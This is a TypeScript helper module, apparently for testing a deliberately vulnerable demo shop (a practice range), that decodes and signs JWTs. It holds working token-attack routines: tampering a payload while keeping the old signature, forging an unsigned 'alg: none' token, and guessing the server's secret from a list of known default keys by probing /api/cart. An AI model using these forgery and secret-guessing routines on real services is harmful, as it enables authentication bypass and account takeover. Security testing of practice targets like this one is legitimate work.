import { createHmac } from 'node:crypto'

export interface JwtPayload {
  [key: string]: any
}

export function decodeJwt(token: string): any {
  const part = token.split('.')[1]
  if (!part) throw new Error(`不是合法 JWT: ${token}`)
  const padded = part + '='.repeat((4 - (part.length % 4)) % 4)
  return JSON.parse(Buffer.from(padded, 'base64url').toString('utf8'))
}

export function signJwt(secret: string, payload: JwtPayload, header: Record<string, any> = { alg: 'HS256', typ: 'JWT' }): string {
  const h = Buffer.from(JSON.stringify(header)).toString('base64url')
  const p = Buffer.from(JSON.stringify(payload)).toString('base64url')
  const signature = createHmac('sha256', secret).update(`${h}.${p}`).digest('base64url')
  return `${h}.${p}.${signature}`
}

export function tamperPayload(token: string, patch: JwtPayload): string {
  const [h, p, s] = token.split('.')
  const payload = { ...decodeJwt(token), ...patch }
  return `${h}.${Buffer.from(JSON.stringify(payload)).toString('base64url')}.${s}`
}

export function noneAlgToken(token: string): string {
  const h = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url')
  const p = token.split('.')[1]
  return `${h}.${p}.`
}

/** 靶场构建时用的历史默认密钥 + 当前默认密钥，兼容重命名前后构建的镜像 */
export const JWT_SECRET_CANDIDATES: string[] = [
  process.env.JWT_SECRET,
  'target_demo-testing-secret-key-please-change-in-production-0123456789',
  'shop-demo-testing-secret-key-please-change-in-production-0123456789'
].filter((s): s is string => Boolean(s))

/** 用候选密钥签一个短期 token，探测后端实际使用的密钥；探测失败返回 null */
export async function detectJwtSecret(client: any, payload: Omit<JwtPayload, 'iat' | 'exp'>): Promise<string | null> {
  const now = Math.floor(Date.now() / 1000)
  for (const secret of JWT_SECRET_CANDIDATES) {
    const token = signJwt(secret, { ...payload, iat: now, exp: now + 300 })
    const res = await client.raw('GET', '/api/cart', { token })
    if (res.status === 200) return secret
  }
  return null
}
